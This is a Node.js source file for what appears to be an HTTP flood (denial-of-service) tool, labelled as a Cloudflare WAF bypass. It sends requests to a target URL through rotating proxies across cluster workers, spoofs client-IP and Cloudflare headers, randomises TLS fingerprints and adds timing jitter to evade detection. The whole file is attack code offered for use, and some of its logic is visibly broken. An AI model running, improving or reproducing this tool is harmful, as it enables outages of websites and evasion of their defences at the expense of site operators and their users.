//mix http 2 1,1 - Enhanced version for Cloudflare WAF bypass
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');
const { Buffer } = require('buffer');

// Enhanced proxy management with validation and health checking
class ProxyManager {
  constructor(proxyFile) {
    this.proxies = [];
    this.healthyProxies = [];
    this.failedProxies = new Map();
    this.proxyStats = new Map();
    this.loadProxies(proxyFile);
    this.startHealthCheck();
  }

  loadProxies(proxyFile) {
    const proxyData = fs.readFileSync(proxyFile, 'utf8').replace(/\r/g, '').split('\n');
    
    this.proxies = proxyData
      .map(line => {
        const [host, port, username, password] = line.split(':');
        if (host && port && !isNaN(port)) {
          return {
            host: host.trim(),
            port: parseInt(port),
            username: username || null,
            password: password || null,
            lastUsed: 0,
            successCount: 0,
            failureCount: 0,
            responseTime: 0
          };
        }
        return null;
      })
      .filter(proxy => proxy !== null);

    if (this.proxies.length === 0) {
      console.error('No valid proxies found');
      process.exit(1);
    }

    this.healthyProxies = [...this.proxies];
    console.log(`Loaded ${this.proxies.length} proxies`);
  }

  getRandomProxy() {
    if (this.healthyProxies.length === 0) {
      this.healthyProxies = [...this.proxies];
      this.failedProxies.clear();
    }

    // Weighted selection based on success rate
    const weights = this.healthyProxies.map(proxy => {
      const successRate = proxy.successCount / (proxy.successCount + proxy.failureCount + 1);
      const responseWeight = Math.max(0, 1000 - proxy.responseTime);
      return successRate * responseWeight;
    });

    const totalWeight = weights.reduce((sum, weight) => sum + weight, 0);
    let random = Math.random() * totalWeight;

    for (let i = 0; i < this.healthyProxies.length; i++) {
      random -= weights[i];
      if (random <= 0) {
        return this.healthyProxies[i];
      }
    }

    return this.healthyProxies[Math.floor(Math.random() * this.healthyProxies.length)];
  }

  markProxySuccess(proxy, responseTime) {
    proxy.successCount++;
    proxy.responseTime = (proxy.responseTime + responseTime) / 2;
    proxy.lastUsed = Date.now();
  }

  markProxyFailure(proxy) {
    proxy.failureCount++;
    
    if (proxy.failureCount > 5 && proxy.failureCount / (proxy.successCount + proxy.failureCount) > 0.7) {
      const index = this.healthyProxies.indexOf(proxy);
      if (index > -1) {
        this.healthyProxies.splice(index, 1);
        this.failedProxies.set(`${proxy.host}:${proxy.port}`, Date.now());
      }
    }
  }

  startHealthCheck() {
    setInterval(() => {
      const now = Date.now();
      for (const [proxyKey, failTime] of this.failedProxies.entries()) {
        if (now - failTime > 60000) {
          const [host, port] = proxyKey.split(':');
          const proxy = this.proxies.find(p => p.host === host && p.port === parseInt(port));
          if (proxy && !this.healthyProxies.includes(proxy)) {
            this.healthyProxies.push(proxy);
            this.failedProxies.delete(proxyKey);
          }
        }
      }
    }, 30000);
  }
}

// Enhanced IP rotation and header spoofing
class IPRotationManager {
  constructor() {
    this.legitIPs = this.generateLegitIPPool();
    this.currentIPIndex = 0;
    this.ipRotationInterval = 5000; // Rotate every 5 seconds
    this.startIPRotation();
  }

  generateLegitIPPool() {
    const asnData = [
      { asn: "AS15169", country: "US", ip: "8.8.8." },
      { asn: "AS8075", country: "US", ip: "13.107.21." },
      { asn: "AS14061", country: "SG", ip: "104.18.32." },
      { asn: "AS13335", country: "NL", ip: "162.158.78." },
      { asn: "AS16509", country: "DE", ip: "3.120.0." },
      { asn: "AS14618", country: "JP", ip: "52.192.0." },
      { asn: "AS32934", country: "US", ip: "157.240.0." },
      { asn: "AS54113", country: "US", ip: "104.244.42." },
      { asn: "AS15133", country: "US", ip: "69.171.250." }
    ];

    return asnData.map(data => ({
      ip: `${data.ip}${Math.floor(Math.random() * 255)}`,
      asn: data.asn,
      country: data.country
    }));
  }

  getCurrentIP() {
    return this.legitIPs[this.currentIPIndex];
  }

  startIPRotation() {
    setInterval(() => {
      this.currentIPIndex = (this.currentIPIndex + 1) % this.legitIPs.length;
    }, this.ipRotationInterval);
  }

  generateAdvancedHeaders() {
    const currentIP = this.getCurrentIP();
    const headers = {};

    // Advanced IP spoofing headers
    if (Math.random() < 0.6) headers["x-forwarded-for"] = currentIP.ip;
    if (Math.random() < 0.5) headers["x-real-ip"] = currentIP.ip;
    if (Math.random() < 0.4) headers["true-client-ip"] = currentIP.ip;
    if (Math.random() < 0.5) headers["cf-connecting-ip"] = currentIP.ip;
    if (Math.random() < 0.3) headers["x-client-ip"] = currentIP.ip;
    if (Math.random() < 0.4) headers["x-cluster-client-ip"] = currentIP.ip;
    if (Math.random() < 0.3) headers["x-original-forwarded-for"] = currentIP.ip;

    // CDN and proxy headers
    if (Math.random() < 0.4) headers["via"] = `1.1 ${currentIP.ip}`;
    if (Math.random() < 0.3) headers["cdn-loop"] = `${currentIP.ip}:${this.generateRandomString(5)}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = currentIP.ip;
    if (Math.random() < 0.3) headers["x-coming-from"] = currentIP.ip;
    if (Math.random() < 0.4) headers["akamai-client-ip"] = currentIP.ip;

    // Cloudflare specific headers
    if (Math.random() < 0.5) headers["cf-ray"] = `${this.generateRandomString(8)}-${currentIP.country}`;
    if (Math.random() < 0.3) headers["cf-visitor"] = '{"scheme":"https"}';
    if (Math.random() < 0.4) headers["cf-ipcountry"] = currentIP.country;

    return headers;
  }

  generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }
}

// Enhanced TLS fingerprint evasion
class TLSFingerprintManager {
  constructor() {
    this.fingerprints = this.generateMultipleFingerprints();
    this.currentFingerprintIndex = 0;
    this.rotationInterval = 10000; // Rotate every 10 seconds
    this.startFingerprintRotation();
  }

  generateMultipleFingerprints() {
    const fingerprints = [];
    
    for (let i = 0; i < 10; i++) {
      fingerprints.push({
        ja3: this.generateJA3Fingerprint(),
        ja4: this.generateJA4Fingerprint(),
        http2: this.generateHTTP2Fingerprint(),
        tls: this.generateTLSFingerprint()
      });
    }
    
    return fingerprints;
  }

  getCurrentFingerprint() {
    return this.fingerprints[this.currentFingerprintIndex];
  }

  startFingerprintRotation() {
    setInterval(() => {
      this.currentFingerprintIndex = (this.currentFingerprintIndex + 1) % this.fingerprints.length;
    }, this.rotationInterval);
  }

  generateJA3Fingerprint() {
    const ciphers = [
      'TLS_AES_128_GCM_SHA256',
      'TLS_AES_256_GCM_SHA384', 
      'TLS_CHACHA20_POLY1305_SHA256',
      'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
      'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
      'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
      'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
      'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
      'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
    ];

    const signatureAlgorithms = [
      'ecdsa_secp256r1_sha256',
      'rsa_pss_rsae_sha256',
      'rsa_pkcs1_sha256',
      'ecdsa_secp384r1_sha384',
      'rsa_pss_rsae_sha384',
      'rsa_pkcs1_sha384'
    ];

    const curves = ['X25519', 'secp256r1', 'secp384r1'];
    const extensions = ['0', '5', '10', '13', '16', '18', '23', '27', '35', '43', '45', '51', '65281'];

    return {
      ciphers: this.shuffleArray([...ciphers]),
      signatureAlgorithms: this.shuffleArray([...signatureAlgorithms]),
      curves: this.shuffleArray([...curves]),
      extensions: this.shuffleArray([...extensions])
    };
  }

  generateJA4Fingerprint() {
    return {
      tlsVersion: 'TLSv1.3',
      cipherSuites: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256',
      extensions: '0,5,10,13,16,18,23,27,35,43,45,51',
      alpn: 'h2,http/1.1',
      curves: 'X25519:secp256r1:secp384r1'
    };
  }

  generateHTTP2Fingerprint() {
    return {
      HEADER_TABLE_SIZE: Math.floor(Math.random() * 16384) + 4096,
      ENABLE_PUSH: Math.random() > 0.5 ? 1 : 0,
      MAX_CONCURRENT_STREAMS: Math.floor(Math.random() * 400) + 100,
      INITIAL_WINDOW_SIZE: Math.floor(Math.random() * 196608) + 65535,
      MAX_FRAME_SIZE: Math.floor(Math.random() * 49152) + 16384,
      MAX_HEADER_LIST_SIZE: Math.floor(Math.random() * 24576) + 8192,
      ENABLE_CONNECT_PROTOCOL: Math.random() > 0.5 ? 1 : 0
    };
  }

  generateTLSFingerprint() {
    return {
      minVersion: 'TLSv1.2',
      maxVersion: 'TLSv1.3',
      cipherSuites: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384',
      signatureAlgorithms: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
      curves: 'X25519:secp256r1:secp384r1',
      alpn: ['h2', 'http/1.1']
    };
  }

  shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
  }
}

// Enhanced request timing and rate limiting
class RequestTimingManager {
  constructor() {
    this.baseDelay = 100;
    this.maxDelay = 2000;
    this.currentDelay = this.baseDelay;
    this.successCount = 0;
    this.failureCount = 0;
    this.adaptiveMode = true;
  }

  getNextDelay() {
    if (!this.adaptiveMode) {
      return this.currentDelay;
    }

    // Adaptive delay based on success/failure ratio
    const successRate = this.successCount / (this.successCount + this.failureCount + 1);
    
    if (successRate > 0.8) {
      // High success rate - can be more aggressive
      this.currentDelay = Math.max(this.baseDelay, this.currentDelay * 0.9);
    } else if (successRate < 0.3) {
      // Low success rate - slow down
      this.currentDelay = Math.min(this.maxDelay, this.currentDelay * 1.2);
    }

    // Add random jitter to avoid detection
    const jitter = (Math.random() - 0.5) * this.currentDelay * 0.2;
    return Math.max(10, this.currentDelay + jitter);
  }

  recordSuccess() {
    this.successCount++;
  }

  recordFailure() {
    this.failureCount++;
  }

  reset() {
    this.successCount = 0;
    this.failureCount = 0;
    this.currentDelay = this.baseDelay;
  }
}

// Initialize enhanced managers
let proxyManager, ipRotationManager, tlsFingerprintManager, requestTimingManager;

// Rest of the original code with enhanced proxy handling
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
  .setMaxListeners(0)
  .on('uncaughtException', function (e) {
    console.log(e);
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
  })
  .on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
  })
  .on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
  })
  .on("SIGHUP", () => {
    return 1;
  })
  .on("SIGCHILD", () => {
    return 1;
  });

// Enhanced go() function with improved proxy handling
function go() {
  const proxy = proxyManager.getRandomProxy();
  const currentIP = ipRotationManager.getCurrentIP();
  const fingerprint = tlsFingerprintManager.getCurrentFingerprint();
  
  let tlsSocket;
  let http11Socket;
  const startTime = Date.now();

  if (!proxy.host || !proxy.port || isNaN(proxy.port)) {
    go();
    return;
  }

  // Enhanced connection with better error handling
  const netSocket = net.connect(Number(proxy.port), proxy.host, () => {
    netSocket.once('data', () => {
      // Enhanced CONNECT request with better headers
      const connectHeaders = [
        `CONNECT ${url.host}:443 HTTP/1.1`,
        `Host: ${url.host}:443`,
        `Connection: Keep-Alive`,
        `Client-IP: ${currentIP.ip}`,
        `X-Client-IP: ${currentIP.ip}`,
        `X-Forwarded-For: ${currentIP.ip}`,
        `X-Real-IP: ${currentIP.ip}`,
        `Via: 1.1 ${currentIP.ip}`,
        `User-Agent: ${generateUserAgent()}`,
        ``
      ].join('\r\n');

      netSocket.write(connectHeaders);

      // Enhanced TLS connection with better fingerprinting
      tlsSocket = tls.connect({
        socket: netSocket,
        ALPNProtocols: ['h2', 'http/1.1'],
        servername: url.hostname,
        ciphers: fingerprint.ja3.ciphers.join(':'),
        sigalgs: fingerprint.ja3.signatureAlgorithms.join(':'),
        secureOptions:
          crypto.constants.SSL_OP_NO_SSLv2 |
          crypto.constants.SSL_OP_NO_SSLv3 |
          crypto.constants.SSL_OP_NO_TLSv1 |
          crypto.constants.SSL_OP_NO_TLSv1_1 |
          crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
          crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
          crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT,
        secure: true,
        session: crypto.randomBytes(64),
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ecdhCurve: fingerprint.ja3.curves.join(':'),
        rejectUnauthorized: false
      }, () => {
        const responseTime = Date.now() - startTime;
        proxyManager.markProxySuccess(proxy, responseTime);
        requestTimingManager.recordSuccess();

        if (tlsSocket.alpnProtocol === 'h2') {
          handleHTTP2Connection();
        } else {
          handleHTTP11Connection();
        }
      });

      tlsSocket.on('error', (error) => {
        proxyManager.markProxyFailure(proxy);
        requestTimingManager.recordFailure();
        tlsSocket.destroy();
        netSocket.destroy();
        setTimeout(go, requestTimingManager.getNextDelay());
      });
    });
  });

  netSocket.on('error', (error) => {
    proxyManager.markProxyFailure(proxy);
    requestTimingManager.recordFailure();
    netSocket.destroy();
    setTimeout(go, requestTimingManager.getNextDelay());
  });

  function handleHTTP2Connection() {
    // Enhanced HTTP/2 handling with better headers
    let streamId = 1;
    let hpack = new HPACK();
    
    // Send HTTP/2 settings
    const settings = [
      [1, 4096],  // HEADER_TABLE_SIZE
      [2, 0],     // ENABLE_PUSH
      [3, 100],   // MAX_CONCURRENT_STREAMS
      [4, 65535], // INITIAL_WINDOW_SIZE
      [5, 16384], // MAX_FRAME_SIZE
      [6, 8192]   // MAX_HEADER_LIST_SIZE
    ];

    tlsSocket.write(encodeFrame(0, 4, encodeSettings(settings)));

    function sendRequest() {
      if (tlsSocket.destroyed) return;

      const method = reqmethod;
      const path = url.pathname + (url.search || '');
      
      // Enhanced headers with IP rotation
      const headers = [
        [':method', method],
        [':authority', url.hostname],
        [':scheme', 'https'],
        [':path', path],
        ['user-agent', generateUserAgent()],
        ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'],
        ['accept-language', 'en-US,en;q=0.9'],
        ['accept-encoding', 'gzip, deflate, br'],
        ['sec-fetch-site', 'none'],
        ['sec-fetch-mode', 'navigate'],
        ['sec-fetch-dest', 'document'],
        ...Object.entries(ipRotationManager.generateAdvancedHeaders())
      ];

      const packed = Buffer.concat([
        Buffer.from([0x80, 0, 0, 0, 0xFF]),
        hpack.encode(headers)
      ]);

      const frame = encodeFrame(streamId, 1, packed, 0x25);
      tlsSocket.write(frame);

      streamId += 2;
      setTimeout(sendRequest, requestTimingManager.getNextDelay());
    }

    sendRequest();
  }

  function handleHTTP11Connection() {
    // Enhanced HTTP/1.1 handling
    function sendRequest() {
      if (tlsSocket.destroyed) return;

      const method = reqmethod;
      const path = url.pathname + (url.search || '');
      
      const headers = [
        `${method} ${path} HTTP/1.1`,
        `Host: ${url.hostname}`,
        `User-Agent: ${generateUserAgent()}`,
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8`,
        `Accept-Language: en-US,en;q=0.9`,
        `Accept-Encoding: gzip, deflate, br`,
        `Connection: keep-alive`,
        ...Object.entries(ipRotationManager.generateAdvancedHeaders()).map(([key, value]) => `${key}: ${value}`)
      ].join('\r\n') + '\r\n\r\n';

      tlsSocket.write(headers);
      setTimeout(sendRequest, requestTimingManager.getNextDelay());
    }

    sendRequest();
  }
}

function generateUserAgent() {
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0'
  ];
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Original utility functions (keeping them for compatibility)
function encodeFrame(streamId, type, payload = "", flags = 0) {
  let frame = Buffer.alloc(9);
  frame.writeUInt32BE(payload.length << 8 | type, 0);
  frame.writeUInt8(flags, 4);
  frame.writeUInt32BE(streamId, 5);
  if (payload.length > 0)
    frame = Buffer.concat([frame, payload]);
  return frame;
}

function encodeSettings(settings) {
  const data = Buffer.alloc(6 * settings.length);
  for (let i = 0; i < settings.length; i++) {
    data.writeUInt16BE(settings[i][0], i * 6);
    data.writeUInt32BE(settings[i][1], i * 6 + 2);
  }
  return data;
}

// Initialize managers when script starts
if (cluster.isMaster) {
  // Master process initialization
  const workers = {};
  const cpuCount = os.cpus().length;
  const workerCount = Math.min(parseInt(process.argv[5]) || 4, cpuCount * 2);

  Array.from({ length: workerCount }, (_, i) => {
    const worker = cluster.fork({
      core: i % cpuCount,
      workerId: i
    });
    workers[worker.id] = worker;
  });

  console.log(`Enhanced Cloudflare Bypass - ${workerCount} workers`);
} else {
  // Worker process initialization
  const reqmethod = process.argv[2];
  const target = process.argv[3];
  const time = parseInt(process.argv[4], 10);
  const threads = process.argv[5];
  const ratelimit = process.argv[6];
  const proxyfile = process.argv[7];

  if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.error('Missing required arguments');
    process.exit(1);
  }

  const url = new URL(target);
  
  // Initialize enhanced managers
  proxyManager = new ProxyManager(proxyfile);
  ipRotationManager = new IPRotationManager();
  tlsFingerprintManager = new TLSFingerprintManager();
  requestTimingManager = new RequestTimingManager();

  // Start sending requests
  const sendRequests = () => {
    go();
    setTimeout(sendRequests, requestTimingManager.getNextDelay());
  };

  sendRequests();

  setTimeout(() => process.exit(1), time * 1000);
}